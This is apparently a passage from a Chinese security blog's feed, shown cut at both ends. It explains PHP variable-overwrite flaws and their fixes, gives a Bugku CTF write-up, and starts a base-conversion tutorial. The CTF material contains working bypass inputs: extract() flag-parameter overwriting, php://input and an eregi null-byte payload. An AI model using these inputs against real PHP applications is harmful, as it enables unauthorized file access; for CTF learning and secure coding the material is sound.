    <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p> <strong>自定义的参数值替换原有变量值的情况称为变量覆盖漏洞</strong> </p><p> <strong>$$**使用不当，</strong>extract()<strong>函数使用不当，</strong>parse_str()<strong>函数使用不当，</strong>import_request_variables()**使用不当，开启了全局变量注册等 </p><h2 id="导致的变量覆盖"><a href="#导致的变量覆盖" class="headerlink" title="$$ 导致的变量覆盖"></a>$$ 导致的变量覆盖</h2><p> <strong>$$这种写法称为可变变量</strong> </p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191113144232213.png" alt="image-20191113144232213"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">$b = <span class="string">&#x27;betao.cn&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> $$a; <span class="comment">// 首先$a = b; 然后$$a = $b; 因为$b=&#x27;betao.cn&#x27;，所以这里输出&#x27;betao.cn&#x27;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>使用foreach来遍历数组中的值，然后再将获取到的数组键名作为变量，数组中的键值作为变量的值。因此就产生了变量覆盖漏洞</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191113145056443.png" alt="image-20191113145056443"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">&#x27;123&#x27;</span>; <span class="comment">// 定义变量$a,值为123</span></span><br><span class="line"><span class="keyword">echo</span> $a; <span class="comment">// 输出值</span></span><br><span class="line"><span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">$&#123;$key&#125; = $value; <span class="comment">// 这里就是漏洞产生的原因，重新定义了变量$a的值</span></span><br><span class="line">    <span class="comment">// $_GET传入参数a,使$key = a; 那么$&#123;$key&#125; = $a; 然后重新定义值，修改了原有的值</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> $a; <span class="comment">// 这里就被改变了</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="extract-函数使用不当"><a href="#extract-函数使用不当" class="headerlink" title="extract()函数使用不当"></a>extract()函数使用不当</h2><blockquote><p> <a href="https://www.runoob.com/php/func-array-extract.html">https://www.runoob.com/php/func-array-extract.html</a> </p></blockquote><p>函数从数组中将变量导入到当前的符号表，即将数组中的键值对注册成函数，使用数组键名作为变量名，使用数组键值作为变量值 </p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191113145722544.png" alt="image-20191113145722544"></p><p> <strong>从以上说明我们可以看到第一个参数是必须的，会不会导致变量覆盖漏洞由第二个参数决定，该函数有三种情况会覆盖已有变量</strong> </p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191113150125531.png" alt="image-20191113150125531"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">&#x27;123&#x27;</span>; <span class="comment">// 定义变量$a的值为123</span></span><br><span class="line">$b = <span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span> =&gt; <span class="string">&#x27;betao.cn&#x27;</span>); <span class="comment">// 定义数组</span></span><br><span class="line">extract($b); <span class="comment">// 数组键名作为变量名，数组键值作为变量值</span></span><br><span class="line"><span class="keyword">echo</span> $a; <span class="comment">// 输出betao.cn</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">extract($_GET); <span class="comment">// GET变量覆盖</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($bdctf)) <span class="comment">//判断变量bdctf是否存在</span></span><br><span class="line">&#123;</span><br><span class="line">$content=trim(file_get_contents($flag)); <span class="comment">//file_get_contents—将整个文件读入一个字符串</span></span><br><span class="line"><span class="comment">//trim—去除字符串首尾处的空白字符（或者其他字符）</span></span><br><span class="line"><span class="keyword">if</span>($bdctf==$content) <span class="comment">// 这里需要使得$bdctf==$content</span></span><br><span class="line">&#123; <span class="keyword">echo</span><span class="string">&#x27;&#123;betao.cn&#125;&#x27;</span>; &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123; <span class="keyword">echo</span><span class="string">&#x27;这不是蓝盾的密码啊&#x27;</span>; &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>代码分析：需要存在<code>$bdctf</code>变量，<code>$bdctf==$content</code>，所以我们定义<code>?bdctf=&amp;flag=</code>拿到flag</p><p>其中，因为<code>content</code>读取的是<code>$flag</code>的值(数据流)</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191113151446634.png" alt="image-20191113151446634"></p><h2 id="parse-str-函数"><a href="#parse-str-函数" class="headerlink" title="parse_str()函数"></a>parse_str()函数</h2><blockquote><p> <a href="https://www.w3school.com.cn/php/func_string_parse_str.asp">https://www.w3school.com.cn/php/func_string_parse_str.asp</a> </p></blockquote><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191113151644506.png" alt="image-20191113151644506"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">&#x27;aaa&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">parse_str(<span class="string">&quot;a=betao.cn&quot;</span>); <span class="comment">//经过parse_str()函数，重新赋值变量$a=&#x27;betao.cn&#x27;;</span></span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191113152059386.png" alt="image-20191113152059386"></p><h2 id="import-request-variables-函数"><a href="#import-request-variables-函数" class="headerlink" title="import_request_variables()函数"></a>import_request_variables()函数</h2><blockquote><p> <a href="https://www.php.net/manual/zh/function.import-request-variables.php">https://www.php.net/manual/zh/function.import-request-variables.php</a> </p></blockquote><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191113152356893.png" alt="image-20191113152356893"></p><ul><li>将 GET／POST／Cookie 变量导入到全局作用域中, </li><li>types 参数指定需要导入的变量, G代表GET，P代表POST，C代表COOKIE</li></ul><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191113152651562.png" alt="image-20191113152651562"></p><p>  <strong>值得注意的是：import_request_variables()函数函数只能用在 PHP4.1 ~ PHP5.4之间，额外以上三种函数，使用时请格外注意，否则非常容易出现变量覆盖漏洞</strong> </p><h2 id="漏洞防范"><a href="#漏洞防范" class="headerlink" title="漏洞防范"></a>漏洞防范</h2><h2 id="extract-函数防御"><a href="#extract-函数防御" class="headerlink" title="extract()函数防御"></a>extract()函数防御</h2><p> 将extract.php中extract()函数<strong>第二个参数修改为extr_skip</strong>:</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191113153208920.png" alt="image-20191113153208920"></p><h2 id="parse-str-函数防御"><a href="#parse-str-函数防御" class="headerlink" title="parse_str()函数防御"></a>parse_str()函数防御</h2><p> parse_str()函数的防范，只能我们自己添加<strong>判断语句</strong> ,例如:</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191113153317624.png" alt="image-20191113153317624"></p><h2 id="import-request-variables-函数防御"><a href="#import-request-variables-函数防御" class="headerlink" title="import_request_variables()函数防御"></a>import_request_variables()函数防御</h2><p> 此函数是非常危险的函数，在PHP5.5之后已被官方删除！ </p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;p&gt; &lt;strong&gt;自定义的参数值替换原有变量值的情况称为变量覆盖漏洞&lt;/strong&gt; &lt;/p&gt;
&lt;p&gt; &lt;strong&gt;$$**使用不当，</summary>
      
    
    
    
    <category term="PHP" scheme="http://www.ywboy.cn/categories/PHP/"/>
    
    <category term="web安全" scheme="http://www.ywboy.cn/categories/PHP/web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="php安全" scheme="http://www.ywboy.cn/tags/php%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Bugku-CTF never give up</title>
    <link href="http://www.ywboy.cn/2020/10/03/Bugku-CTF-never-give-up/"/>
    <id>http://www.ywboy.cn/2020/10/03/Bugku-CTF-never-give-up/</id>
    <published>2020-10-03T07:15:49.000Z</published>
    <updated>2020-10-03T08:35:38.253Z</updated>
    
    <content type="html"><![CDATA[<h2 id="never-give-up"><a href="#never-give-up" class="headerlink" title="never give up"></a>never give up</h2><p><a href="http://123.206.87.240:8006/test/hello.php">题目链接</a></p><p>F12，发现有个<code>1p.html</code></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191111161727342.png" alt="image-20191111161727342"></p><p>访问发现被重定向了Bugku官网，我们burp抓包拦截</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191111161903598.png" alt="image-20191111161903598"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%3Cscript%3Ewindow.location.href%3D%27http%3A&#x2F;&#x2F;www.bugku.com%27%3B%3C&#x2F;script%3E%20%0A%3C%21--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ%3D%3D--%3E</span><br></pre></td></tr></table></figure><p>首先我们将那些百分号，也就是url编码的进行解码，URL解码为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.location.href&#x3D;&#39;http:&#x2F;&#x2F;www.bugku.com&#39;;&lt;&#x2F;script&gt; </span><br><span class="line">&lt;!--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ&#x3D;&#x3D;--&gt;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191111162138927.png" alt="image-20191111162138927"></p><p>解码完了以后，发现还需要url解码</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191111162239688.png" alt="image-20191111162239688"></p><p>解码后的结果整理了以下，源代码为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// &quot;;</span></span><br><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">&#x27;id&#x27;</span>]) <span class="comment">// 限制了url非空非零的变量id</span></span><br><span class="line">&#123;</span><br><span class="line">header(<span class="string">&#x27;Location: hello.php?id=1&#x27;</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">$id=$_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">$a=$_GET[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">$b=$_GET[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="comment">// 以上定义三个GET请求的变量</span></span><br><span class="line"><span class="keyword">if</span>(stripos($a,<span class="string">&#x27;.&#x27;</span>)) <span class="comment">// 变量$a 不能含有.</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;no no no no no no no&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line">$data = @file_get_contents($a,<span class="string">&#x27;r&#x27;</span>); <span class="comment">// 获取数据，来自与$a</span></span><br><span class="line"><span class="keyword">if</span>($data==<span class="string">&quot;bugku is a nice plateform!&quot;</span> <span class="keyword">and</span> $id==<span class="number">0</span> <span class="keyword">and</span> strlen($b)&gt;<span class="number">5</span> <span class="keyword">and</span> eregi(<span class="string">&quot;111&quot;</span>.substr($b,<span class="number">0</span>,<span class="number">1</span>),<span class="string">&quot;1114&quot;</span>) <span class="keyword">and</span> substr($b,<span class="number">0</span>,<span class="number">1</span>)!=<span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 判断条件的代码很有意思</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">1. $data弱等于字符串bugku is a nice plateform!</span></span><br><span class="line"><span class="comment">2. $id弱等于整数型0</span></span><br><span class="line"><span class="comment">3. 变量$b的长度大于5 strlen()函数的作用是判断字符串的长度</span></span><br><span class="line"><span class="comment">4. 字符串 1114 要与字符串 111 连接变量 $b 的第一个字符构成的正则表达式匹配</span></span><br><span class="line"><span class="comment">5. $b 的第一个字符不能弱等于整数4</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">&quot;f4l2a3g.txt&quot;</span>);</span><br><span class="line">    <span class="comment">// 包含文件 f4l2a3g.txt</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;never never never give up !!!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>因为暴露了flag文件的地址，我们直接访问<a href="http://123.206.87.240:8006/test/f4l2a3g.txt">http://123.206.87.240:8006/test/f4l2a3g.txt</a> 即可得到flag</p><p>但我们需要突破的是判断的那一层，如何绕过</p><p>我们接下来分析<code>$a,$b,$id</code>三个变量</p><h2 id="PHP弱类型比较"><a href="#PHP弱类型比较" class="headerlink" title="PHP弱类型比较"></a>PHP弱类型比较</h2><p>首先我们来说以下<code>$id</code>弱类型,代码看懂问题</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191111163914021.png" alt="image-20191111163914021"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191111164050811.png" alt="image-20191111164050811"></p><blockquote><p>参考表： <a href="https://www.php.net/manual/zh/types.comparisons.php">https://www.php.net/manual/zh/types.comparisons.php</a> </p></blockquote><h2 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h2><p>因为源代码中变量<code>$data</code>是由file_get_contents()函数读取变量<code>$a</code>,所以<code>$a</code>必须为数据流</p><p>在这里<code>$a=bugku is a nice plateform!</code>所以我们需要使用伪协议<code>php://</code>来访问输出数据库, 其中 <code>php://input</code>可以访问原始请求数据中的只读流。这里令 <code>$a = php://input</code> ，并且提交的数据流为<code>bugku is a nice plateform!</code></p><blockquote><p>关于PHP支持的协议详解（参考官网）: <a href="https://www.php.net/manual/zh/wrappers.php">https://www.php.net/manual/zh/wrappers.php</a> </p></blockquote><h2 id="eregi-截断漏洞"><a href="#eregi-截断漏洞" class="headerlink" title="eregi() 截断漏洞"></a>eregi() 截断漏洞</h2><p>这里是我第一次遇到，所以我才想把这题做个记录。</p><p>在PHP中 <code>ereg()</code> 函数或 <code>eregi()</code> 函数存在空字符截断漏洞，即参数中的正则表达式或待匹配字符串遇到空字符则截断丢弃后面的数据</p><ul><li><p>GET请求</p><ul><li>%00</li></ul></li><li><p>POST请求</p><ul><li>0x00 或者手动修改hex数据为00</li></ul><p>源码中待匹配字符串（第二个参数）已确定为 <code>&quot;1114&quot;</code>，正则表达式（第一个参数）由 <code>&quot;111&quot;</code> 连接 <code>$b</code> 的第一个字符组成，若令 <code>substr($b,0,1) = &quot;\x00&quot;</code>，即满足 <code>&quot;1114&quot;</code> 与 <code>&quot;111&quot;</code>匹配 ，因此在这里，我们假设<code>$b=\x0012345</code>也就满足以上三个条件！！！</p></li></ul><blockquote><p>PHP黑魔法： <a href="https://skysec.top/2017/07/22/PHP%E5%87%BD%E6%95%B0%E9%BB%91%E9%AD%94%E6%B3%95%E5%B0%8F%E6%80%BB%E7%BB%93/">PHP函数黑魔法小总结</a>  | <a href="https://www.cnblogs.com/xishaonian/p/7628152.html">CTF之PHP黑魔法总结</a></p></blockquote><h2 id="FLAG"><a href="#FLAG" class="headerlink" title="FLAG"></a>FLAG</h2><p>接下来我们就构造请求来拿flag，注意，因为我们这边是GET请求，所以我们使用url编码的’%00’即可</p><p>还有一点要注意 <code>$id</code>只能使用弱类型，不能等于0,虽然判断条件哪里==0,但是被重定向的判断限制了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if(!$_GET[&#39;id&#39;]) &#x2F;&#x2F; 限制了url非空非零的变量id</span><br><span class="line">&#123;</span><br><span class="line">header(&#39;Location: hello.php?id&#x3D;1&#39;);</span><br><span class="line">exit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果<code>$id=0</code></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191111170040342.png" alt="image-20191111170040342"></p><p>所以我们必须利用弱类型拿下flag,注意，虽然 b=%0012345 实际字符串长度为 8 字节，但在后台脚本读入数据时，会将 URL 编码 %00 转换成 1 字节。所以说，空字符应该在后台脚本的变量中出现，而不是在 URL 查询字符串变量中出现</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191111170126672.png" alt="image-20191111170126672"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>eregi() 截断漏洞/ 学到了学到了!</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;never-give-up&quot;&gt;&lt;a href=&quot;#never-give-up&quot; class=&quot;headerlink&quot; title=&quot;never give up&quot;&gt;&lt;/a&gt;never give up&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;http://123.206.87</summary>
      
    
    
    
    <category term="网络安全" scheme="http://www.ywboy.cn/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="CTF" scheme="http://www.ywboy.cn/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>PHP进制相互转换学习</title>
    <link href="http://www.ywboy.cn/2020/10/03/PHP%E8%BF%9B%E5%88%B6%E7%9B%B8%E4%BA%92%E8%BD%AC%E6%8D%A2%E5%AD%A6%E4%B9%A0/"/>
    <id>http://www.ywboy.cn/2020/10/03/PHP%E8%BF%9B%E5%88%B6%E7%9B%B8%E4%BA%92%E8%BD%AC%E6%8D%A2%E5%AD%A6%E4%B9%A0/</id>
    <published>2020-10-03T07:11:26.000Z</published>
    <updated>2020-10-03T08:18:40.340Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>  不管是SQL注入，还是CTF的web题，都有涉及16进制转换，所以特此学习以下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 1. 十进制转二进制 decbin()函数</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;12-&gt;十进制转二进制为: &quot;</span>.decbin(<span class="number">12</span>); <span class="comment">//输出：1100</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"><span class="comment">// string decbin(int number)返回一字符串，包含有给定 number 参数的二进制表示。所能转换的最大数值为十进制的 </span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 十进制转八进制decoct()函数</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;15-&gt;十进制转八进制: &quot;</span>.decoct(<span class="number">15</span>); <span class="comment">// 输出: 17</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"><span class="comment">//string decoct ( int number ) 返回一字符串，包含有给定 number 参数的八进制表示</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 十进制转十六进制 dechex() 函数</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;10-&gt;十进制转16进制: &quot;</span>.dechex(<span class="number">10</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"><span class="comment">// string dechex ( int number ) 返回一字符串，包含有给定 number 参数的十六进制表示</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. 二进制转十六进制 bin2hex() 函数</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;1100-&gt;二进制转十六进制为: &quot;</span>.bin2hex(<span class="string">&#x27;1100&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 二进制转十进制 bindec()函数</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;1100-&gt;二进制转十六进制为: &quot;</span>.bindec(<span class="string">&#x27;1100&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 八进制转十进制 octdec()函数</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;17-&gt;八进制转十进制: &quot;</span>.octdec(<span class="string">&#x27;17&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. 十六进制转十进制 hexdec()</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;aaa-&gt;十六进制转十进制: &quot;</span>.hexdec(<span class="string">&#x27;aaa&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 终极武器.任意进制转换 base_convert(),在此举两个例子</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;520-&gt;十进制转十六进制: &quot;</span>.base_convert(<span class="string">&#x27;520&#x27;</span>, <span class="number">10</span>, <span class="number">16</span>); <span class="comment">// 十进制转16进制</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;aaa-&gt;十六进制转十进制: &quot;</span>.base_convert(<span class="string">&#x27;aaa&#x27;</span>, <span class="number">16</span>, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line"><span 